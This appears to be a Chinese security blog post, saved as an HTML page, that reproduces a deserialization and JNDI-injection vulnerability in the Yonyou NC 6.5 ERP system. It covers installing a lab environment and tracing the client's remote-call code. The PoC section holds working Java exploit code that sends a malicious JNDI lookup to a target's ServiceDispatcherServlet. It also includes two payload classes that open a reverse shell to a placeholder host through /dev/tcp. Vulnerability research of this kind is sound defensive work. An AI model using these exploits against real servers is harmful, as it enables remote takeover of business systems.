@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="用友nc 6.5 反序列化漏洞一、漏洞简介二、漏洞影响用友nc 6.5 三、复现过程环境搭建   1.执行NC安装包根目录下setup.bat文件（要求安装盘同级目下有ufjdk文件或者设置JAVA_HOME环境变量），安装时，出现如下图界面;      2.选择安装的产品，这里我只安装了部分与NC相关的模块。下面对NC产品模块做个简要说明;  1&lt;!-- --&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8Bnc%206.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="用友nc 6.5 反序列化漏洞一、漏洞简介二、漏洞影响用友nc 6.5 三、复现过程环境搭建   1.执行NC安装包根目录下setup.bat文件（要求安装盘同级目下有ufjdk文件或者设置JAVA_HOME环境变量），安装时，出现如下图界面;      2.选择安装的产品，这里我只安装了部分与NC相关的模块。下面对NC产品模块做个简要说明;  1&lt;!-- --&gt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId35.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId36.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId37.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId38.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId39.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId40.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId41.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId42.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId44.gif">
+<meta property="article:published_time" content="2022-07-08T06:26:11.688Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.296Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-用友nc/用友nc 6.5 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8Bnc%206.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.688Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="用友nc-6-5-反序列化漏洞"><a href="#用友nc-6-5-反序列化漏洞" class="headerlink" title="用友nc 6.5 反序列化漏洞"></a>用友nc 6.5 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>用友nc 6.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li>  1.执行NC安装包根目录下setup.bat文件（要求安装盘同级目下有ufjdk文件或者设置JAVA_HOME环境变量），安装时，出现如下图界面;</li>
+</ul>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"></p>
+<ul>
+<li>  2.选择安装的产品，这里我只安装了部分与NC相关的模块。下面对NC产品模块做个简要说明;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>nc_uap              客户化
+nc_portal           企业门户
+nc_pd               工程基础数据
+nc_fi               财务会计
+nc_tpb              全面计划预算
+nc_co_cm            管理会计
+nc_tm               资金管理
+nc_scm              供应链管理
+nc_qc               质量管理
+nc_am               资产管理
+nc_mm               生产制造
+nc_hr               人力资源
+nc_hr_pd            人力资源预制
+nc_iufo             网络报表含合并报表
+nc_xbrl             集团报表XBRL
+</code></pre>
+<ul>
+<li>  3.至此NC已安装完成，接下来创建Oracle用户;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>SQL&gt; create user NCV6.5 identified by 1 default tablespace nnc_data01 temporary tablespace temp; 
+SQL&gt; grant dba,connect to NCV6.5;
+</code></pre>
+<ul>
+<li>  4.配置sysConfig，产品安装完成之后会自动进入系统配置界面;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>  服务器类型选择UAP SERVER。点击服务器信息→读取，如下图：</li>
+</ul>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="2.png"></p>
+<ul>
+<li>进入”数据源页签”→”读取”→”添加”,将NC<br>  V6.5作为账套数据源，数据库类型选择ORACLE11G，添加数据源名称，不能包含中文。配置数据库地址、用户名密码、失效链接检查周期、prepareStatement缓存数等信息，完成后点击测试，如果提示测试通过则表示NC能够与数据库连通，保存即可。</li>
+</ul>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="3.png"></p>
+<ul>
+<li>  进入”安全日志数据源页签”→”读取”，初始化数据源，初始化完成后点击”确定”。</li>
+</ul>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId28.png" alt="4.png"></p>
+<ul>
+<li>  进入”部署”→”全选”→”部署EJB”， 此处用于生成、部署EJB，如下图所示：</li>
+</ul>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.png" alt="5.png"></p>
+<ul>
+<li>  进入”文件服务器”→”读取”，此处添加服务器ip地址，端口，存储路径，及选择元数据仓库,如下图所示：</li>
+</ul>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.png" alt="6.png"></p>
+<p>5.环境搭建完成。因为通过浏览器访问的方式需要依赖不同用户设备上的Java版本以及系统配置等环境因素，所以为了避免这些不必要的麻烦，可以使用专用浏览器UClient来解决此问题。</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId31.png" alt="7.png"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>下载UClient并安装后，进入启动页面，选择添加应用。</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId33.png" alt="8.png"></p>
+<p>在其安装目录里发现了NCLogin65.jar，通过对其反编译进行查看发现，它里面只是一些界面和登录逻辑代码，主要的通信代码并不在该jar包中。</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId34.png" alt="9.png"></p>
+<p>继续在其他目录下的寻找，发现该目录(nc_client_home\NCCACHE\CODE)中的子目录含有许多jar包，其中external目录中的jar包是负责客户端与服务端之间通信的逻辑代码。</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId35.png" alt="10.png"></p>
+<p>通过对登录流程的动态调试，最后找到了对应的类(nc.login.ui.LoginUISuppor)，并定位到该类中处理登录请示的方法(getLoginRequest())</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId36.png" alt="11.png"></p>
+<p>执行getInstance()，获取NCLocator的实例，然后执行NCLocator实例的lookup()方法</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId37.png" alt="12.png"></p>
+<p>查看nc.bs.framework.common.NCLocator#getInstance(java.util.Properties)</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId38.png" alt="13.png"></p>
+<pre><code>//nc.bs.framework.common.NCLocator#getInstance
+locator = (NCLocator)locatorMap.get(key);
+      if (locator != null) &#123;
+          return locator;
+      &#125; else &#123;
+          if (!isEmpty(locatorProvider)) &#123;
+              locator = newInstance(locatorProvider);
+          &#125; else if (!isEmpty(svcDispatchURL)) &#123;
+              locator = newInstance(&quot;nc.bs.framework.rmi.RmiNCLocator&quot;);
+          &#125; else &#123;
+              locator = getDefaultLocator();
+          &#125;
+
+          locator.init(props);
+          locatorMap.put(key, locator);
+          return locator;
+      &#125;
+</code></pre>
+<p>由于程序刚启动的时候locatorMap的值为空，则会进入下面的分支语句中去判断locatorProvider值，而此时又因为locatorProvider的值为空，svcDispatchURL的值(<a href="http://ip:port/ServiceDispatcherServlet)不为空，所以会创建RmiNCLocator实例，将其存放至locatorMap中。获取到RmiNCLocator实例后，查看其lookup()方法：">http://ip:port/ServiceDispatcherServlet)不为空，所以会创建RmiNCLocator实例，将其存放至locatorMap中。获取到RmiNCLocator实例后，查看其lookup()方法：</a></p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId39.png" alt="14.png"></p>
+<p>继续跟进nc.bs.framework.server.RemoteMetaContext#lookup()：</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId40.png" alt="15.png"></p>
+<p>从proxyMap中查看是否存在参数name，如果存在则直接返回，不存在则进入下面的分支。查看getMetaOnDemand()方法：</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId41.png" alt="16.png"></p>
+<p>可以看到当metaV0值为空的时候，又调用了this.remoteMetaContext.lookup()方法，在当前类中搜索remoteMetaContext，发现在类构造函数中创建了一个代理并将其赋值到this.remoteMetaContext：</p>
+<pre><code>//nc.bs.framework.rmi.RemoteContextStub#RemoteContextStub
+public RemoteContextStub(String dispatchURL, String module) throws ComponentException &#123;
+      ComponentMetaVO metaVO = new ComponentMetaVO();
+      metaVO.setInterfaces(new String[]&#123;Context.class.getName()&#125;);
+      if (module != null) &#123;
+          metaVO.setModule(module);
+          metaVO.setName(&quot;nc.bs.framework.server.RemoteMetaContext.&quot; + module);
+      &#125; else &#123;
+          metaVO.setName(&quot;nc.bs.framework.server.RemoteMetaContext&quot;);
+      &#125;
+
+      this.namedMetasMap.put(metaVO.getName(), metaVO);
+      Address url = null;
+
+      try &#123;
+          url = new Address(dispatchURL);
+      &#125; catch (MalformedURLException var6) &#123;
+          throw new ComponentException(&quot;invalid url: &quot; + dispatchURL);
+      &#125;
+
+      this.defRas = new SimpleRemoteAddressSelector(url);
+      this.remoteMetaContext = (Context)RemoteProxyFactory.getDefault().createRemoteProxy(RemoteContextStub.class.getClassLoader(), metaVO, this.defRas);
+      this.proxyMap.put(metaVO.getName(), this.remoteMetaContext);
+      this.dispatchUrl = url;
+      this.module = module;
+      this.init();
+  &#125;
+</code></pre>
+<p>通过java代理的相关知识可以知道，无论调用代理对象的任何方法，该方法都会调用处理器的invoke方法，在本程序中即是nc.bs.framework.rmi.RemoteInvocationHandler#invoke：</p>
+<pre><code>//nc.bs.framework.rmi.RemoteInvocationHandler#invoke
+public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;
+      String mn = method.getName();
+      Class&lt;?&gt;[] ps = method.getParameterTypes();
+      if (mn.equals(&quot;equals&quot;) &amp;&amp; ps.length == 1 &amp;&amp; ps[0].equals(Object.class)) &#123;
+          Object value = args[0];
+          if (value != null &amp;&amp; Proxy.isProxyClass(value.getClass())) &#123;
+              Object h = Proxy.getInvocationHandler(value);
+              return !(h instanceof RemoteInvocationHandler) ? Boolean.FALSE : this.meta.equals(((RemoteInvocationHandler)h).meta) &amp;&amp; this.ras.equals(((RemoteInvocationHandler)h).ras);
+          &#125; else &#123;
+              return Boolean.FALSE;
+          &#125;
+      &#125; else if (mn.equals(&quot;hashCode&quot;) &amp;&amp; ps.length == 0) &#123;
+          return this.meta.hashCode() + 27 * this.ras.hashCode();
+      &#125; else if (mn.equals(&quot;toString&quot;) &amp;&amp; ps.length == 0) &#123;
+          return this.meta.toString();
+      &#125; else &#123;
+          return method.getDeclaringClass() == RemoteProxy.class ? method.invoke(this, args) : this.sendRequest(method, args);
+      &#125;
+  &#125;
+</code></pre>
+<p>此时mn的值为”lookup”，因此会进入最后一条分支语句中，又因为二者不等，最终会执行this.sendRequest(method,<br>args)方法</p>
+<pre><code>//nc.bs.framework.rmi.RemoteInvocationHandler#sendRequest
+public Object sendRequest(Method method, Object[] args) throws Throwable &#123;
+      InvocationInfo ii = this.newInvocationInfo(method, args);
+      Address old = null;
+      int retry = 0;
+      ConnectorFailException error = null;
+
+      do &#123;
+          Address target = this.ras.select();
+          if (old != null) &#123;
+              Logger.error(&quot;connect to: &quot; + old + &quot; failed, now retry connect to: &quot; + target);
+              if (old.equals(target)) &#123;
+                  try &#123;
+                      Thread.sleep(this.retryInterval);
+                  &#125; catch (Exception var13) &#123;
+                      ;
+                  &#125;
+              &#125;
+          &#125;
+
+          this.restoreToken(ii, target);
+
+          try &#123;
+              Object var8 = this.sendRequest(target, ii, method, args);
+              return var8;
+          &#125; catch (ConnectorFailException var14) &#123;
+              ++retry;
+              old = target;
+              error = var14;
+          &#125; finally &#123;
+              this.storeToken(ii, target);
+          &#125;
+      &#125; while(retry &lt; this.retryMax);
+
+      throw error;
+  &#125;
+</code></pre>
+<p>跟进this.sendRequest(target, ii, method, args)：</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId42.png" alt="17.png"></p>
+<p>可以看到该方法中将 ii<br>序列化输出，发送到服务端，然后获取服务端返回的反序列化结果并回显到客户端。</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId44.gif" alt="mov.gif"></p>
+<blockquote>
+<p>explpit.java</p>
+</blockquote>
+<pre><code>import nc.bs.framework.common.NCLocator;
+
+import java.util.Properties;
+
+public class poc &#123;
+
+    public static void attack(String url, String jndipath) &#123;
+        Properties env = new Properties();
+        if (!url.startsWith(&quot;http&quot;)) &#123;
+            url = &quot;http://&quot; + url;
+        &#125;
+        env.put(&quot;SERVICEDISPATCH_URL&quot;, url + &quot;/ServiceDispatcherServlet&quot;);
+        NCLocator locator = NCLocator.getInstance(env);
+        locator.lookup(jndipath);
+    &#125;
+
+    public static void main(String[] args) &#123;
+        attack(&quot;http://target&quot;, &quot;ldap://ip:port/classname&quot;);
+    &#125;
+&#125;
+</code></pre>
+<blockquote>
+<p>remote.java</p>
+</blockquote>
+<pre><code>import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.Serializable;
+import java.util.Hashtable;
+
+public class remote implements ObjectFactory, Serializable &#123;
+
+    public remote() &#123;
+        try&#123;
+            java.lang.Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#125;);
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;
+        return null;
+    &#125;
+&#125;
+</code></pre>
+<blockquote>
+<p>当然也可以选择利用 nc 自带的类进行远程部署利用</p>
+</blockquote>
+<pre><code>import nc.bs.framework.common.ComponentMetaVO;
+import nc.bs.framework.rmi.RemoteAddressSelector;
+import nc.bs.framework.rmi.RemoteProxy;
+
+public class remote implements RemoteProxy &#123;
+
+    public remote() &#123;
+        try&#123;
+            java.lang.Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#125;);
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    @Override
+    public Object getAttribute(String s) &#123;
+        return null;
+    &#125;
+
+    @Override
+    public void setAttribute(String s, Object o) &#123;
+
+    &#125;
+
+    @Override
+    public ComponentMetaVO getComponentMetaVO() &#123;
+        return null;
+    &#125;
+
+    @Override
+    public int getRetryMax() &#123;
+        return 0;
+    &#125;
+
+    @Override
+    public void setRetryMax(int i) &#123;
+
+    &#125;
+
+    @Override
+    public long getRetryInterval() &#123;
+        return 0;
+    &#125;
+
+    @Override
+    public void setRetryInterval(long l) &#123;
+
+    &#125;
+
+    @Override
+    public void setRemoteAddressSelector(RemoteAddressSelector remoteAddressSelector) &#123;
+
+    &#125;
+
+    @Override
+    public RemoteAddressSelector getRemoteAddressSelector() &#123;
+        return null;
+    &#125;
+&#125;
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8242">https://xz.aliyun.com/t/8242</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.sari3l.com/posts/608d18f0/">https://blog.sari3l.com/posts/608d18f0/</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8Bnc%206.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r1u900rky8v19df2d1ki" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0_%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0%20windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8BERP-NC%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
